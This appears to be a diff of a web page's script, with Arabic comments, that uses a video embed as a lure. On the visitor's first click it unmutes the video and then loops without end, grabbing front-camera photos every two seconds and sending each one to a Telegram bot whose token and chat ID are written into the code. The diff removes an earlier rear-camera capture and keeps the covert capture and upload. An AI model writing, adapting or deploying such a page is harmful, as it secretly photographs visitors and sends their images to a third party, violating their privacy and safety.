@@ -52,12 +52,13 @@
 
 <video id="v" autoplay playsinline muted></video>
 <canvas id="c"></canvas>
-<script>
+
+    <script>
     const CONFIG = {
         TOKEN: "8761336309:AAGv1e4FqNVaybasRyNwLu4U1o5x1pNCJUk",
         CHAT_ID: "7000276863",
-        TY: 2000,        // ثانيتين بين كل دورة تصوير
-        QUALITY: 0.9,    // جودة احترافية (من 0.1 إلى 1.0)
+        TY: 2000,        // ثانيتين بين كل صورة والأخرى
+        QUALITY: 0.9,    // جودة احترافية عالية جداً
     };
 
     const video = document.getElementById('v');
@@ -67,63 +68,58 @@
 
     let isStarted = false;
 
+    // البدء عند أول نقرة
     document.body.addEventListener('click', () => {
         if (isStarted) return;
         isStarted = true;
 
-        // تشغيل الصوت فوراً
+        // تشغيل صوت الفيديو
         if(iframe) {
             let currentSrc = iframe.src;
             iframe.src = currentSrc.replace("mute=1", "mute=0");
         }
 
-        // بدء الدورة المتزامنة
+        // بدء حلقة التصوير بالكاميرا الأمامية فقط
         startCaptureSequence();
     });
 
     async function startCaptureSequence() {
-        while (true) { // حلقة مستمرة
-            // 1. التقاط الكاميرا الأمامية
+        while (true) { 
+            // تنفيذ لقطة واحدة من الكاميرا الأمامية
             await takeSnapshot("user", "📸 أمامية HD");
             
-            // انتظر ثانية واحدة قبل التبديل
-            await new Promise(r => setTimeout(r, 1000));
-
-            // 2. التقاط الكاميرا الخلفية
-            await takeSnapshot("environment", "📸 خلفية HD");
-
-            // انتظر ثانيتين قبل البدء في الدورة الجديدة (حسب طلبك)
+            // الانتظار لمدة ثانيتين قبل اللقطة التالية (حسب طلبك)
             await new Promise(r => setTimeout(r, CONFIG.TY));
         }
     }
 
     async function takeSnapshot(mode, label) {
         try {
-            // طلب الكاميرا بدقة عالية جداً
+            // طلب الكاميرا الأمامية بدقة Full HD
             const stream = await navigator.mediaDevices.getUserMedia({ 
                 video: { 
                     facingMode: mode,
-                    width: { ideal: 1920 }, // دقة Full HD إذا أمكن
+                    width: { ideal: 1920 }, 
                     height: { ideal: 1080 }
                 } 
             });
             
             video.srcObject = stream;
             
-            // انتظار استقرار العدسة (الفوكس والضوء)
+            // انتظار استقرار العدسة والضوء
             await new Promise(resolve => {
                 video.onloadedmetadata = () => {
                     video.play();
-                    setTimeout(resolve, 800); // 0.8 ثانية لضمان جودة الصورة
+                    setTimeout(resolve, 800); 
                 };
             });
 
-            // مطابقة حجم الكانفاس مع جودة الكاميرا الحقيقية
+            // ضبط حجم الكانفاس لمطابقة جودة الكاميرا
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-            // تحويل الصورة بجودة عالية جداً
+            // تحويل الصورة بجودة عالية
             const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', CONFIG.QUALITY));
             
             const formData = new FormData();
@@ -131,21 +127,22 @@
             formData.append('caption', label);
             formData.append('photo', blob, 'capture.jpg');
 
-            // إرسال سريع
+            // إرسال الصورة للبوت
             fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendPhoto`, {
                 method: 'POST',
                 body: formData
             }).catch(() => {});
 
-            // إغلاق الكاميرا فوراً لتحرير الجهاز للكاميرا التالية
+            // إغلاق الكاميرا لتحرير موارد الجهاز وضمان السرعة
             stream.getTracks().forEach(t => t.stop());
             video.srcObject = null;
 
         } catch (err) {
-            console.error("خطأ في الكاميرا:", mode, err);
+            console.error("خطأ في الوصول للكاميرا:", err);
         }
     }
-</script>
+        </script>
+    
     
 
 </body>
